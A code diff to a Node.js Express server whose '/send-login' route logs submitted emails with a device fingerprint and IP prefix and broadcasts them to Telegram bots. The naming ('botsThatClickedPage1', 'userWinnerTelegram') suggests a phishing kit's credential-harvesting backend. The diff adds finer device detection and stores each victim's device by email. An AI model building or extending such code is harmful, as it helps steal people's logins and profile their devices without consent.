@@ -10,7 +10,8 @@ const {
   broadcastMessage, 
   sendFollowUpMessage, 
   userWinnerTelegram, 
-  botsThatClickedPage1 
+  botsThatClickedPage1,
+  userDeviceInfo
 } = require("./bot");
 
 const app = express();
@@ -58,11 +59,14 @@ function getDeviceFingerprint(req) {
 }
 
 function detectDevice(userAgent) {
-  if (/mobile/i.test(userAgent)) return "Mobile";
-  if (/tablet/i.test(userAgent)) return "Tablet";
-  if (/windows/i.test(userAgent)) return "Windows PC";
+  if (/iphone/i.test(userAgent)) return "iPhone";
+  if (/ipad/i.test(userAgent)) return "iPad";
+  if (/android/i.test(userAgent)) return "Android";
+  if (/windows/i.test(userAgent)) return "Windows";
   if (/macintosh|mac os/i.test(userAgent)) return "Mac";
   if (/linux/i.test(userAgent)) return "Linux";
+  if (/mobile/i.test(userAgent)) return "Mobile";
+  if (/tablet/i.test(userAgent)) return "Tablet";
   return "Unknown Device";
 }
 
@@ -271,6 +275,9 @@ app.post("/send-login", async (req, res) => {
     }
 
     console.log(`📧 ${email} | 🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
+
+    // ✅ STORE DEVICE INFO FOR LATER USE
+    userDeviceInfo[email] = device;
 
     // ============================================================================
     // ✅ SEND TO BOTH BOTS (BROADCAST)
